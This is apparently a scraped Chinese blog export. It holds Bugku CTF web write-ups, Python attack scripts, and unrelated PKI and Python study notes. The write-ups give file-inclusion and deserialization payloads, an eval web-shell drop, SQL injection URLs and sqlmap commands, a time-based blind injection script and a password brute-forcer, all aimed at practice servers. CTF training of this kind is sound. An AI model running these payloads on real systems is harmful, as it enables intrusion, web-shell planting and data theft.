include($file); //hint.php &#125;else&#123; echo &quot;you are not admin ! &quot;; &#125; --&gt; file_get_contents函数将一个文件读入字符串中，只要使用php:&#x2F;&#x2F;input请求流即可，因为php:&#x2F;&#x2F;input拿的是post中的数据，所以需要在post框中输入welcome to the bugkuctf include($file)可以看出是明显的文件包含，可以利用php:&#x2F;&#x2F;filter来读取源码 ?txt=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;&amp;password= [POST DATA] welcome to the bugkuctf 把得到的base64编码解码之后得到源码 &lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 尝试包含flag.php，出现乱码，再包含index.php &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;涓嶈兘鐜板湪灏辩粰浣爁lag鍝�&quot;; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo &quot;you are not the number of bugku ! &quot;; &#125; ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php &#125;else&#123; echo &quot;you are not admin ! &quot;; &#125; --&gt; 发现只要序列化flag，当flag对象被转换为字符串时，会执行__tostring()，且会输出$file参数的内容，提示参数的内容是flag.php 本地序列化一下Flag对象 &lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; $a = new Flag; $a-&gt;file = &quot;flag.php&quot;; echo serialize($a); 输出：O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 通过password将Flag序列化之后的值传入即可得到flag ?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; [POST DATA] welcome to the bugkuctf 还有一种思路，利用文件包含漏洞远程执行php代码，写入一个一句话木马，用菜刀连接也可以得到flag http://120.24.86.145:8006/test1/?txt=php://input&amp;file=data://text/plain,&lt;?php fputs(fopen(&quot;shells.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_GET[a]) ?&gt;&quot;);phpinfo(); ?&gt;&amp;password=3&amp;a=$_POST[a] [POST DATA] welcome to the bugkuctf 过狗一句话分析提示中的代码 $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); 把poc的字符串以#分割成数组 $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 将数组中的值按照012345的顺序排起来，即assert $poc_2($_GET[&#39;s&#39;]) ?&gt; 可以看成assert($_GET[&#39;s&#39;]) assert可以将输入的字符串当做php代码来执行，这就是一个任意代码执行漏洞 ?s=print_r(scandir(&#39;./&#39;)) 访问f14g.txt即可获得flag 字符？正则？访问获得源代码 &lt;?php highlight_file(&#39;2.php&#39;); $key=&#39;KEY&#123;********************************&#125;&#39;; $IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM )&#123; die(&#39;key is: &#39;.$key); &#125; ?&gt; 关键点在于中间匹配的正则表达式，匹配成功则输出flag /key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i 表达式的意思为，开头两个key，两个key中间有任意0或多个字符，两个key之后有一个任意字符，这个字符要重复4到7次，之后有一个key：，key：之后有一对&#x2F;&#x2F;，中间有任意一个字符，然后是0或多字个符，再是一个key，之后是任意一个小写字母，最后是任意一个标点符号 按照上面说的，结合起来传入即可获得flag ?id=keykeyaaaakey:/a/keya: 前女友右键源代码，发现有提示code.txt，访问这个文件，得到源代码 &lt;?php if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; $v3 = $_GET[&#39;v3&#39;]; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125; &#125; ?&gt; 这题跟之前做过的md5弱类型比较一样，要求传入的v1和v2的值不一样，但是md5值一样 绕过这一层之后，还有一层!strcmp($v3, $flag)，这里利用strcmp函数本身的漏洞，当传入的值为数组，函数会null，取反之后就会变成true从而达成绕过 strcmp输入一个数组就会返回null ?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=1 login1(SKCTF)init为约束攻击，直接点击注册页面，输入admin 1(admin和1之间有非常多的空格)，密码随意，用这个密码登录admin账号即可获得flag 约束攻击的原理是，当mysql执行插入语句时，如果插入的值超过一定的长度(好像是32位)，就会把超出的部分丢掉，只插入前面的部分，而空格在存入数据库时也会被丢掉。但是如果空格后面还有字符的话，空格就不会被丢掉，所以输入admin 1，当之间的空格足够多以至于超过限度时，mysql就会把超过的部分丢掉，丢掉之后，因为admin后面都是空格，在存入的时候就变成了admin，相当于重新创建了一个admin账号 你从哪里来打开网页，问你是不是从google来的，用bp抓包，增加一个referer字段即可 Referer: https://www.google.com md5 collision(NUPT_CTF)题目名字为md5碰撞，碰撞的意思是值不同但是md5值相同，输入?a&#x3D;s878926199a即可返回flag 需要注意的是，如果输入的值是QNKCDZO，虽然也是md5碰撞，但是不会返回flag，猜测服务器端是用QNKCDZO来进行比较的 程序员本地网站要求从本地访问，用bp抓包，加上X-Forwarded-For: 127.0.0.1字段即可 各种绕过 &lt;?php highlight_file(&#39;flag.php&#39;); $_GET[&#39;id&#39;] = urldecode($_GET[&#39;id&#39;]); $flag = &#39;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#39;; if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) &#123; if ($_GET[&#39;uname&#39;] == $_POST[&#39;passwd&#39;]) print &#39;passwd can not be uname.&#39;; else if (sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])&amp;($_GET[&#39;id&#39;]==&#39;margin&#39;)) die(&#39;Flag: &#39;.$flag); else print &#39;sorry!&#39;; &#125; ?&gt; 要求输入的uname和passwd的sha1值相同但值不同，sha1和ma5一样，处理不了数组，输入数组即可绕过，注意passwd要用post输入。id值只要等于margin就行 http://120.24.86.145:8002/web7/?uname[]=123&amp;id=margin [POST DATA] passwd[]=1234 web8&lt;?php extract($_GET); if (!empty($ac)) &#123; $f = trim(file_get_contents($fn)); if ($ac === $f) &#123; echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;; &#125; else &#123; echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;; &#125; &#125; ?&gt; 看到file_get_contents函数，无脑php伪协议就完事了 ?ac=1&amp;fn=php://input [POST DATA] 1 求getshell如果有源代码的话，这题其实不难，但是没有源代码的情况下，这题其实很难解，只能说打ctf太需要脑洞了 服务器端架设了waf，当waf检测到Content-Type：multipart&#x2F;form-data字段时，会去检查文件后缀是否有php，如果有则拦下，这里用大小写绕过，Content-Type：Multipart&#x2F;form-data即可 绕过waf之后，因为是黑名单检测，只过滤了php，用php5也可以绕过，把文件名改为php.php5即可 php、php3、php4、php5、pht、phtml这些都会被解析成php 这是一个神奇的登录框这是一个很简单的登录框 没有过滤任何东西，直接在username框中注入即可，因为有回显和报错，所以报错注入也是可以的 用sqlmap跑也是一种方法 因为是post注入，可以用bp，抓包之后右键copy to file，然后用sqlmap跑 sqlmap.py -r &quot;D:\\1.txt&quot; -p admin_name --dbs sqlmap.py -r &quot;D:\\1.txt&quot; -D bugkusql1 -p admin_name --tables sqlmap.py -r &quot;D:\\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns sqlmap.py -r &quot;D:\\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump 多次修改id可以看到提示是sql注入 这里的注入比较简单，可以用异或注入来判断到底过滤了什么 在id=1后面输入&#39;^(0)^&#39; 不出错 把0换成1=1 出错 表示可以使用异或注入 异或注入时，如果括号中的内容是真的，那页面会返回错误 那么同理，如果我修改里面的内容为length(‘union’)!=0 如果页面显示正确，那就证明length(‘union’)是等于0的，也就是union被过滤了 测试之后发现union&#x2F;select&#x2F;or&#x2F;and被过滤了，重写绕过即可 注入之后发现表中有两个字段，flag1和address，flag1中是一串意义不明的代码，address是下一关地址，点进去发现还是一个注入 测试过后发现重写不管用了，但是会回显错误信息，用报错注入 http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 0x776562313030322d32 ),0x7e),1) %23 class,flag2 http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =0x666c616732 ),0x7e),1) %23 flag2,address http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(address) from flag2 ),0x7e),1) %23 http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2 ),0x7e),1) %23 ./Have_Fun.php 其实这里已经注出flag，但是还有个address字段，内容是&#x2F;Have_Fun.php，访问之后提示只能192.168.0.100才能访问 bp抓包之后，加入CLIENT-IP: 192.168.0.100字段，访问成功，是一个二维码，扫出的结果如下 你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#*ad…*@#！*&amp;@…c…… 猜测还是注入，但是不管在哪个页面都没用，flag在admin里，也有可能是文件包含 题目中说的第二个flag应该是在这里找，但是似乎没有人去找过 文件包含2进入网页，url中的file&#x3D;hello.php很可疑 话虽如此，但是php伪协议好像是被过滤了 右键源代码，发现了upload.php的提示，点进去发现是文件上传 试了一下，发现过滤规则还蛮严的，好像过滤了&lt;php和?&gt;，但因为存在文件包含，所以我们不必非要传一个php上去，构造一句话木马 GIF89a &lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt; 之后访问这个文件，查看源代码就可以发现有一个this_is_th3_F14g_154f65sd4g35f4d6f43.txt，访问就是flag flag.php提示中的hint居然是参数，做CTF真的是很需要脑洞 输入120.24.86.145:8002/flagphp/?hint=1可以获得源代码 &lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie = $_COOKIE[&#39;ISecer&#39;]; if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === &quot;$KEY&quot;) &#123; echo &quot;$flag&quot;; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY=&#39;ISecer:www.isecer.com&#39;; ?&gt; 审计代码之后可知，只要用cookie传入一个序列化之后的值，这个值通过反序列化之后与$key值相等即可输出flag 需要注意的是，$key值到最后才定义，也就是说事实上在前面的if语句中，$key值是null 本地调试 $cookie = serialize(&#39;&#39;); echo $cookie; //s:0:&quot;&quot;; var_dump(unserialize($cookie) === &quot;$KEY&quot;); //bool(true) null序列化之后的值为s:0:&quot;&quot;; 由于传入cookie值时，；不会被传过去，所以需要url编码才行 Cookie: ISecer=s:0:&quot;&quot;%3b 孙xx的博客渗透的第一步，信息收集 御剑扫出个robots.txt，点进去就是flag了 未完待续","categories":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://perfect-time.xyz/tags/wp/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}]},{"title":"python自动化脚本学习笔记","slug":"python-auto-script","date":"2018-10-18T09:21:35.000Z","updated":"2022-07-05T06:59:04.000Z","comments":true,"path":"2018/10/18/python-auto-script/","link":"","permalink":"https://perfect-time.xyz/2018/10/18/python-auto-script/","excerpt":"为什么要用脚本，愉快的手工注入不好吗？","text":"为什么要用脚本，愉快的手工注入不好吗？ 自己写的一些脚本bugku-成绩单# -*- coding: UTF-8 -*- import requests import time url = &quot;http://123.206.87.240:8002/chengjidan/&quot; flag=&#39;&#39; k=&quot;abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|&#125;&#123;:?&gt;&lt;[];,.`~ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; 匹配用的字符串 # 先手工测试长度 # 1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4 # 测试表长 # 1&#39; and length((select group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;))=10 # 测试列长 # 1&#39; and length((select skctf_flag from fl4g))=31 # 测试flag长 for x in range(1,32): #这里的range范围为上一步测试的长度+1 for s in k: #遍历取出字符 startTime=time.time() #获取响应时间（大概） #payload = &quot;1&#39; AND IF(SUBSTRING(DATABASE(), &quot;+ str(x) +&quot;, 1) = &#39;&quot;+ s +&quot;&#39;, SLEEP(5), 1)#&quot; #猜解数据库 #payload = &quot;1&#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;+ str(x) +&quot;,1)=&#39;&quot;+ s +&quot;&#39;,sleep(5),1)#&quot; #猜解表名 #payload = &quot;1&#39; and if(substr((select column_name from information_schema.columns where table_name=&#39;fl4g&#39; limit 0,1),&quot;+ str(x) +&quot;,1)=&#39;&quot;+ s +&quot;&#39;,sleep(5),1)#&quot; #猜解列名 payload = &quot;1&#39; and if(substr((select skctf_flag from fl4g),&quot;+ str(x) +&quot;,1)=&#39;&quot;+ s +&quot;&#39;,sleep(5),1)#&quot; #爆flag r = requests.post(url,data=&#123;&#39;id&#39;:payload&#125;) #发送请求 if time.time() - startTime &gt; 4: #判断延时是否为5秒 flag+=s #是的话拼接字符串，然后退出循环 print &quot;flag is ：&quot;+flag #打印字符串 break r.encoding = &#39;UTF-8&#39; #运行之后的结果以utf-8编码显示（有些题目可能不需要用到这个） print &#39;flag is :&#39; + flag #打印出最终的字符串 raw_input(&quot;Press &lt;enter&gt;&quot;) 运行结果： 不知道为什么第一个字符会是乱码，不过好在最后的结果没有问题 bugku-秋名山老司机# -*- coding: UTF-8 -*- import requests import re url = &quot;http://123.206.87.240:8002/qiumingshan/&quot; s = requests.Session() r = s.get(url) k = re.search(&#39;(?&lt;=&lt;div&gt;)(.*)(?==)&#39;,r.text).group(0) #正则表达式匹配字符串，使用零宽断言来匹配式子 v = eval(k) r = s.post(url, data=&#123;&#39;value&#39;:v&#125;) r.encoding = &#39;UTF-8&#39; print(r.text) raw_input(&quot;Press &lt;enter&gt;&quot;) 运行结果: 关键在于正则表达式的书写 bugku-速度要快# -*- coding: UTF-8 -*- import requests import base64 import re url = &quot;http://123.206.87.240:8002/web6/&quot; s = requests.Session() #保持访问时的session r = s.get(url).headers[&quot;flag&quot;] #flag在消息头中，这样可以获取消息头中的flag参数 r = str(base64.b64decode(r)) #将获取到字符串base64解码 &#39;&#39;&#39; k = re.search(&#39;(?&lt;=:)(.*)&#39;,r).group(0) #正则匹配，匹配等号后面的flag r = base64.b64decode(k) #再将匹配的结果base64编码 &#39;&#39;&#39; r = base64.b64decode(r.split(&quot;: &quot;)[1]) #获取等号后面的flag r = s.post(url,data=&#123;&#39;margin&#39;:r&#125;) #通过post传值 print(r.text) raw_input(&quot;Press &lt;enter&gt;&quot;) 运行结果： 蓝鲸ctf-不明觉厉# -*- coding: UTF-8 -*- import requests import re import sys reload(sys) sys.setdefaultencoding(&#39;utf-8&#39;) #encoding = &#39;UTF-8&#39; url = &quot;http://ctf.whaledu.com:10010/web38/9s81jWjd98YU.php&quot; for x in range(11111,12111): #选定密码的范围 s = requests.Session() #每次请求时获取session值 r = s.get(url) #由获取到的session值来请求页面 k = re.search(&#39;\\d&#123;3&#125;&#39;,r.text).group(0) #正则匹配，匹配三个连续的数字，返回第一条匹配结果 r = s.get(url+&#39;?username=admin&amp;password=&#39;+ str(x) +&#39;&amp;randcode=&#39;+k) #构造访问语句 r.encoding = &#39;UTF-8&#39; &#39;&#39;&#39; #由请求返回的长度来判断，错误请求页面的长度都是一样的，当长度不一样时，返回的就是正确的页面 if len(r.content)!=163: print(&#39;密码是&#39; + str(x) + &#39;\\n&#39;) print(r.content) break &#39;&#39;&#39; &#39;&#39;&#39; #由访回的页面中是否有密码错误来判断 if &#39;密码错误&#39; not in r.text: print(&#39;密码是&#39; + str(x) + &#39;\\n&#39;) print(r.content) break &#39;&#39;&#39; if &#39;密码错误&#39; in r.text: #同样是由返回的页面中是否有密码错误来判断，区别是会回显脚本运行过程 print(&#39;密码&#39;+ str(x) +&#39;错误&#39;) else: print(&#39;密码是&#39; + str(x) + &#39;\\n&#39;) print(r.content) break raw_input(&quot;Press &lt;enter&gt;&quot;) 运行结果： 直接运行会出现乱码， 所以也只能在编译器里运行了","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"脚本","slug":"脚本","permalink":"https://perfect-time.xyz/tags/%E8%84%9A%E6%9C%AC/"}],"keywords":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}]},{"title":"PKI学习笔记","slug":"PKIstudy","date":"2018-10-08T01:07:59.000Z","updated":"2022-07-05T06:58:46.000Z","comments":true,"path":"2018/10/08/PKIstudy/","link":"","permalink":"https://perfect-time.xyz/2018/10/08/PKIstudy/","excerpt":"老叶的课还是一如既往的催眠","text":"老叶的课还是一如既往的催眠 导论PKI是什么Public Key Infrastructure，公钥基础设施 以公钥为基础的数字证书 信息安全广义上的网络安全即网络空间安全，狭义上的网络安全为信息安全 信息安全的内涵： 信息的机密性、信息的真实性、信息的完整性、抗依赖性 想要保证信息是安全的，要做到信息的内部与外部安全，外部安全即各种设备的防护，内部安全则是信息自身要足够强壮 密码技术分为三种，对称密码、非对称密码、Hash函数(单向散列) 古典密码与现代密码古典密码古典密码大多只有替代法和换位法两种 替代法：将明文中的字母按照一定的规律换成其他字母 换位法：将明文中的字母重新进行排列 同音密码：一个字母有多种替换方案，用来应对频率分析法 现代密码明文：M、密文：C、加密：E、解密：D 加密：C&#x3D;E（M，Ke） 解密：M&#x3D;D（M，Kd） 互逆：M&#x3D;D(E（M，Ke)，kd) 加密密钥ke，解密密钥Kd 密码技术的安全不依赖于算法的保密，只依赖于密钥的保密 对称密码概念对称密码算法也叫传统密码算法，传统密码算法继承了古典密码的算法，本质上为现代密码 对称密码的安全基础是对密钥K的保密 对称密码算法：DES、IDEA、AES、RC DES概念数据加密标准，用于加密保护静态存储和传输信道中的数据 DES是一个分组密码，明文、密文、密钥都是64位 DES是一对对合运算，即加密和解密是可以互逆的，明文M进去，密文C出来；密文C进去，明文M出来 对合运算的优点在于省钱，拿芯片来举例，加密和解密只需要用一块芯片就可以解决 3EDS:把明文经过3次DES加密的即为3DES 工作流程 1、DES把明文以64位分组，没有满足64位的用0填充，具体的后面会说。之后把输入的64位二进制数据打乱，为初始置换ip；经过一系列变换置换再换回去，为逆初始置换ip 2、置换之后，前32位为L0，后32位为R0，R0经过函数f处理之后，与L0做异或运算，得到的结果作为下一轮的R1，而没有经过f函数处理过的R0作为下一轮的L1，再次执行前一步的步骤，循环16轮 3、用64位的密钥生成16个48位的子密钥，分别输入16轮中的f函数中 4、f函数的本质是将输入的32位二进制和48位的子密钥做异或运算，但是他们的位数不同，是无法做异或的，这就需要将32位扩展到48位，输出时再将48位精简成32位 5、先做扩展运算，扩展原理如下表 表中的数字代表位，两列黄色数据是扩展的数据，可以看出，扩展的数据是从相邻两组分别取靠近的一位，4位变为6位 6、异或运算之后，要进行S盒替换来把48位精简为32位。DES定义了一个S盒，一共有8个S盒。S盒为4行5列，每行是打乱的0-15的矩阵。把输入的6位二进制数的头与尾合成一个两位二进制作为行号，中间的四位数作为列号，对应的一个0-15的数，把这个数用四位二进制来表示 7、S盒代替运算的32位输出按照P盒进行置换。该置换把输入的每位映射到输出位，任何一位不能被映射两次，也不能被略去，映射规则如下 表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。 8、64位的密钥生成16个48位的字密钥，分别输入16轮中的f函数中，64位中最后8位为奇偶校验位，所以真正的密钥只有56位。通过移位循环来生成16个子密钥 9、当最后一块明文不满足64位时，有很多种方法解决，一般是使用00填充，然后可以在尾部附上8个字节，这8个字节表示初始明文的长度，这样解密者解密之后，就知道截取多少字节的长度了。这只是其中一种做法，事实上有很多种方法，只要发送方和接收方事先约定好即可 非对称密码概念加密：C&#x3D;E(M,Ke);解密M&#x3D;D(C,Kd);Ke不等于Kd 把加密密钥ke公开，成为公钥；解密密钥kd保留，成为私钥 公钥密码的安全基础是利用数学上的难题来设计密钥，确保ke不能推出kd 非对称密码算法：RSA、ELGamal(离散对数)、ECC(椭圆曲线) RSA概念RSA的安全性是基于大整数素因子的分解的困难性，从而保证ke不等于kd 从安全的角度出发，密钥至少要为500位长，比如512位、1024位、2048位,标准为1024位RSA的加密E和解密D采用指数运算 密钥生成1、随机选择两个大素数p和q，并保密 2、计算n&#x3D;pq，将n公开 3、计算φ(n)&#x3D;(p-1)(q-1)，并保密φ(n) 4、随机选择正整数e，1&lt;e&lt;φ(n),且(e,φ(n))&#x3D;1，将e公开 5、计算d，ed mod φ(n)&#x3D;1，并保密d 公钥ke&#x3D;&lt;n,e&gt;,私钥kd&#x3D;&lt;p,q,d,φ(n)&gt; 结论 n&#x3D;pq 无法由n推出pq φ(n)&#x3D;(p-1)(q-1) 由于p、q无法得知，φ(n)也无法算出 ed mod φ(n)&#x3D;1 在φ(n)未知的情况下，无法由e推出d 设计完之后，把pq都销毁掉，只保留一个d也可以用于加密解密 加密解密加密E：C&#x3D;E(M,Ke)&#x3D;Me mod n 解密D：M&#x3D;D(C,Kd)&#x3D;Cd mod n 互逆：D(E(M,Ke),Kd)&#x3D;(Me)d mod n&#x3D;Med mod n&#x3D;M 因为RSA是幂指数运算，所以可以用公钥加密，私钥解密，也可以用私钥加密，公钥解密 数字签名因为私钥是绝对唯一的，所以RSA的安全基础就在于此 当发送方与接收方通信时，发送方要怎么证明自己是自己呢?利用数字签名就可以解决这个问题 发送方在发送密文前，先随便写一段明文，将明文用私钥加密，就得到了数字签名S，将数字签名S和加密前的明文一起发送给接收方。因为私钥是唯一的，所以只有真正的发送方才能用真正的私钥加密，接收方得到S之后，用发送方的公钥解密，得到的明文与发送方发过来的明文相比较，如果一致则可以认定为真正的发送方 (发送方)私钥加密，(发送方)公钥解密实现数字签名 (接收方)公钥加密，(接收方)私钥解密实现保密通信 单向散列函数H&#x3D;Hash(M) 信息摘要，M为明文，H为哈希值，为固定长度，称为报文摘要，或者数据指纹 单向(不可逆)：M→H，H无法推出M 散列(抗碰撞)：不存在碰撞现象 如M1≠M2，则Hash(M1)≠Hash(M2) Hash函数算法：MD5(128bit)、SHA-1(160bit)、SHA256(256bit) 未完待续~","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"PKI","slug":"PKI","permalink":"https://perfect-time.xyz/tags/PKI/"}],"keywords":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}]},{"title":"python学习笔记","slug":"python","date":"2018-09-07T14:59:49.000Z","updated":"2022-07-05T06:58:58.000Z","comments":true,"path":"2018/09/07/python/","link":"","permalink":"https://perfect-time.xyz/2018/09/07/python/","excerpt":"python是世界上最好的语言.jpg","text":"python是世界上最好的语言.jpg 对象类型集合集合的定义定义集合是一种无序不重复对象类型 集合类似字典，但是只有键，没有值 set（【1，2，3，4】） set（【’e’,’d’,’i’,’h’,’o’,’,’,’r’,’w’,’;’】） 集合(set) 功能消除重复元素 实现交、并、差等数学计算 语法set（【元素1，元素2，元素3……】） 变量&#x3D;set（列表&#x2F;字符串） 先要有其他的列表或者字符串，再用set（）变为集合 特征无序 类似字典，没有序列&#x2F;索引，不支持切片和索引 不重复 每个项都是唯一的 可变&amp;不可变 可变集合set；不可变集合frozenset 操作符交集&amp; 获取集合中相同的元素 &gt;&gt;&gt; l1 = [1,2,3,4,5] &gt;&gt;&gt; l2 = [2,3,4,5,6] &gt;&gt;&gt; s1 = set(l1) &gt;&gt;&gt; s1 set([1, 2, 3, 4, 5]) &gt;&gt;&gt; s2 = set(l2) &gt;&gt;&gt; s2 set([2, 3, 4, 5, 6]) &gt;&gt;&gt; s1 &amp; s2 set([2, 3, 4, 5]) 并集| 将集合中的元素合并 &gt;&gt;&gt;s1|s2 set（【1，2，3，4，5，6】） 差集- 获取集合中不同的元素，不同的元素在s1中 &gt;&gt;&gt; s1 - s2 set([1]) ^ 对称差分，获取集合中不同的元素，元素在不同的集合中 &gt;&gt;&gt; s1 ^ s2 set([1, 6]) 内置函数交集s.intersection（t） 集合s和集合t的交集 并集s.union（t） 集合s和集合t的并集 差集s.difference（） 差集 s.symmetric_difference（） 对称差分 增加s.add（） 增加元素 s.update（） 增加集合中的元素，用于集合叠加 删除s.remove（） 删掉特定的元素，若没有则报错 s.discard（） 删掉特定的元素，若没有不报错 s.pop（） 删掉一个元素，随机删除 清除s.clear（） 清除该集合 判断s.issubset（） 判断s1是否为s2的子集 s.issuperset（） 判断s1是否包含s2，与上一个相反 映射字典的定义字典的定义字典是一种无序的集合对象类型，可以存储任意的数据类型 如：{‘A’:1,’B’:2,’C’:3} 字典是python中位移的映射类型，通过key-value键值方式存储数据 与列表相比，字典是无序的，列表有有序的；列表采用偏移位置来存取，字典采用键&#x2F;散列映射来存取，速度快效率高 字典的功能支持复杂的数据存储和处理 用于存储其他对象信息 python最强大的容器 语法{key 1:value1,key2:value2,key3:value3,……} 变量&#x3D;{键1：值1，键2：值2……} 原理先将key用哈希函数进行转换，得到每个key对应的一个哈希值 再讲哈希值与变量对应，做成一张表 每次需要查找的时候，先用哈希函数计算出哈希值，再去表中查找对应的变量 速度快，但是需要更多的存储量 特征无序，字典中没有索引位置这个概念 可变，键是不可变的，而且必须是唯一的，值是可变的，相同值可以出现在同一个字典里 键只能用数字、字符串。元组等不可变的对象组成，不能用列表 一个键只能对应一个值 操作符查找操作符d【k】 通过键k，查询字典中的某元素的值 &gt;&gt;&gt; d =&#123;&#39;A&#39;:1,&#39;B&#39;:2,&#39;C&#39;:3&#125; &gt;&gt;&gt; d[&#39;A&#39;] 1 d【k】&#x3D;v 通过键k，给字典中的k赋值v，若没有k，则新增加进来 &gt;&gt;&gt; d =&#123;&#39;A&#39;:1,&#39;B&#39;:2,&#39;C&#39;:3&#125; &gt;&gt;&gt; d[&#39;A&#39;] = 10 &gt;&gt;&gt; d &#123;&#39;A&#39;: 10, &#39;C&#39;: 3, &#39;B&#39;: 2&#125; 成员操作符&gt;&gt;&gt; &#39;A&#39; in d True &gt;&gt;&gt; &#39;a&#39; not in d True 内置函数d.items（） 返回一个由字典d的键-值对应的关系图 d.keys（） 返回一个由字典d的键组成的关系图 d.values（） 返回一个由字典d的值组成的关系图 d.get（key） 返回与key相关联的值 d.pop（key） 删除键key并返回与之相关联的值 d.popitem（） 删除某个键值对，返回被删除的对，不需要指定某一值 d.clear（） 删除字典d中的所有元素 d.copy（） 复制字典d d.update（e） 合并，将e中的值添加到d中 d.setdefault（key.v） 如果键key包含在字典d中，则返回；否则就添加到d中 d.has_key（key） 判断某个key是否在字典中，如果有返回True，没有Flase 数字数字：内建函数数值计算函数abs（） 返回给定参数的绝对值 pow（） 用于指数计算 pow（2，5）意为2的5次方 round（） 用于给定一个浮点数进行截断处理 or 告诉round函数精确到小数点后多少位 round（8.55555，3）精确到小数点第三位 divmod（） 把出发和余运算结合，结果为包含商和余数的结合 divmod（10，3）→（3。1） coerce（） 把两个不同类型的数值转换为同一种类型，哪个数值更复杂就转换为哪种数值 coerce（10，0.1）→（10.0，0.1） 类型转换函数将给的数值转换为特定的类型 int （） 将数字类型转换为整数 complex（） 将数字类型转换为复数 float（） 将数字类型转换为浮点数 long（） 将数字类型转换为长整数 bool（） 